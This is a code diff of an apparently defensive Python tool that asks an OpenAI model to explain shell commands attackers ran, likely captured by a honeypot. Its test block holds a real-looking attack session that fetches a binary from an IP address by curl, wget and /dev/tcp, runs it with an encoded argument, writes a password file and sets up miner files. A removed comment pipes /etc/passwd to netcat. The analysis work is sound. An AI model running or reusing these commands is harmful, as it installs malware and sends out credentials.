@@ -1,14 +1,6 @@
-import os
-import pathlib
-import json
-import ast
-import hashlib
-import re
+from analyzerbase import *
 
-from openai import OpenAI
-#from openai import ServiceUnavailableError, InvalidRequestError
-import openai
-
+from openai import OpenAI, OpenAIError
 OPENAI_API_KEY = os.environ.get('OPENAI_API_KEY')
 
 class OpenAIAnalyzer:
@@ -28,7 +20,7 @@ class OpenAIAnalyzer:
             response = getter_fn(**kwargs)
             return parser_fn(response)
         except Exception as e:
-            if isinstance(e, (openai.OpenAIError)):
+            if isinstance(e, (OpenAIError)):
                 print(e)
                 return f'OpenAI Error: {e}'
             else:
@@ -56,7 +48,7 @@ class OpenAIAnalyzer:
         return result
     
     def format_commands(self, commands):
-        return json.dumps({str(n):cmd for n, cmd in enumerate(commands)}, indent=0)
+        return json.dumps({ str(n) : cmd for n, cmd in enumerate(commands)}, indent=0 )
 
     def explain_commands(self, commands=[], n=1, retries=0, **kwargs):
         system_prompt = " ".join([
@@ -67,9 +59,12 @@ class OpenAIAnalyzer:
         "The explanation_string values will be used in a GitHub .md file so you can use markdown syntax to format your output.",
         "You should group adjcent commands into logical groups and explain what the attacker was trying to do with each command.",
         ])
-        example_commands1 = ["wget http://example.com -O /usr/bin/example.sh", "cd /usr/bin;chmod +x example.sh", 
-                             "./example.sh >> example_output.py", "exec example_output.py || python3 example_output.py &",
-                             "ps -ajfx | grep example_output.py", "rm example.sh",  "rm example_output.py", "exit"]
+        example_commands1 = ["wget http://example.com -O /usr/bin/example.sh", 
+                             "cd /usr/bin;chmod +x example.sh", 
+                             "./example.sh >> example_output.py", 
+                             "exec example_output.py || python3 example_output.py &",
+                             "ps -ajfx | grep example_output.py", 
+                             "rm example.sh",  "rm example_output.py", "exit"]
         example_commands1 = self.format_commands(commands)
 
         example_response1 = {
@@ -126,35 +121,32 @@ class OpenAIAnalyzer:
             if len(result) == len(commands):
                 return dict(zip(commands, result))
             else:
-                return dict(zip(commands, result))
+                return dict(zip(commands, result + [""] * (len(commands) - len(result))))
         
         if isinstance(result, dict):
-            if len(result) == len(commands):
+            keys = list(result.keys())
+
+            if len(keys) == len(commands):
                 result = [k + v for k,v in result.items()]
                 return dict(zip(commands, result))
             
-            if all([isinstance(k, int) for k in result.keys()]):  
+            if all([isinstance(k, int) for k in keys]):  
                 return {commands[i]: result.get(i) for i in range(len(commands))}
             
-            num_keys_re = re.compile(r"(\d+)\-?(\d*)")
-            keys = list(result.keys())    
-            if all([num_keys_re.match(k) for k in keys]):
-                # last_key = keys[-1]
-                # start, end = num_keys_re.match(last_key).groups()
-                # last_index = int(end) if end != "" else int(start)
-                # offset = 0
+            valid_range_keys = re.compile(r"(\d+)\-?(\d*)")
+            key_matches = { k : valid_range_keys.match(k) for k in keys }
+            
+            if all(key_matches):
                 grouped_commands = []
-                for k in result.keys():
-                    start, end = num_keys_re.match(k).groups()
+                for k in keys:
+                    start, end = key_matches[k].groups()
                     if end == "":
-                        i = int(start) #+ offset
+                        i = int(start)
                         grouped_commands.append(commands[i])
                     else:
-                        start, end = int(start), int(end) #+ offset
+                        start, end = int(start), int(end)
                         grouped_commands.append("\n".join(commands[start:end]))
-
-                        #Now start using offset
-                        #offset = len(commands) - last_index - 1            
+                
 
                 return dict(zip(grouped_commands, result.values()))
 
@@ -169,11 +161,28 @@ class OpenAIAnalyzer:
 
 
 if __name__ == "__main__":
-    oa = OpenAIAnalyzer(OPENAI_API_KEY)
-    #example_commands2 = ["cd / && ls -l", "cat /etc/passwd | nc 20.7.1.69 420", "./example.sh >> example_output.py", "e cho 'This command is an error'", "exec example_output.py" ]
-    #result = oa.explain_commands(example_commands2)
+    cmds = ['echo 1 && cat /bin/echo', 
+            'nohup $SHELL -c "curl http://94.230.232.6:60142/linux -o /tmp/f1HcUi057v', 
+            'if [ ! -f /tmp/f1HcUi057v ]; then wget http://94.230.232.6:60142/linux -O /tmp/f1HcUi057v; fi;', 
+            "if [ ! -f /tmp/f1HcUi057v ]; then exec 6<>/dev/tcp/94.230.232.6/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/f1HcUi057v && chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==; fi;", 'echo 123456 > /tmp/.opass', 
+            'chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==" &', 'head -c 0 > /tmp/X23ZoPo761', 'chmod 777 /tmp/X23ZoPo761', '/tmp/X23ZoPo761 TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==', 
+            'cp /tmp/X23ZoPo761 /tmp/linux',
+            'head -c 0 > /tmp/windows',
+            'head -c 0 > /tmp/windows_sign',
+            'head -c 0 > /tmp/arm_linux',
+            'head -c 0 > /tmp/mips_linux',
+            'head -c 0 > /tmp/mips_linux_sign',
+            'head -c 0 > /tmp/winminer',
+            'head -c 0 > /tmp/arm_linux_sign',
+            'head -c 0 > /tmp/winminer_sign',
+            'head -c 0 > /tmp/miner_sign',
+            'head -c 0 > /tmp/miner',
+            'head -c 0 > /tmp/mipsel_linux',
+            'head -c 0 > /tmp/mipsel_linux_sign',
+            'head -c 0 > /tmp/linux_sign',
+            'exit'
+        ]
     
-    cmds = ['echo 1 && cat /bin/echo', 'nohup $SHELL -c "curl http://94.230.232.6:60142/linux -o /tmp/f1HcUi057v', 'if [ ! -f /tmp/f1HcUi057v ]; then wget http://94.230.232.6:60142/linux -O /tmp/f1HcUi057v; fi;', "if [ ! -f /tmp/f1HcUi057v ]; then exec 6<>/dev/tcp/94.230.232.6/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/f1HcUi057v && chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==; fi;", 'echo 123456 > /tmp/.opass', 'chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==" &', 'head -c 0 > /tmp/X23ZoPo761', 'chmod 777 /tmp/X23ZoPo761', '/tmp/X23ZoPo761 TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==', 'cp /tmp/X23ZoPo761 /tmp/linux']
-    cmds += ['head -c 0 > /tmp/windows', 'head -c 0 > /tmp/windows_sign', 'head -c 0 > /tmp/arm_linux', 'head -c 0 > /tmp/mips_linux', 'head -c 0 > /tmp/mips_linux_sign', 'head -c 0 > /tmp/winminer', 'head -c 0 > /tmp/arm_linux_sign', 'head -c 0 > /tmp/winminer_sign', 'head -c 0 > /tmp/miner_sign', 'head -c 0 > /tmp/miner', 'head -c 0 > /tmp/mipsel_linux', 'head -c 0 > /tmp/mipsel_linux_sign', 'head -c 0 > /tmp/linux_sign', 'exit']
+    oa = OpenAIAnalyzer(OPENAI_API_KEY)
     result = oa.explain_commands(cmds)
     print(result)
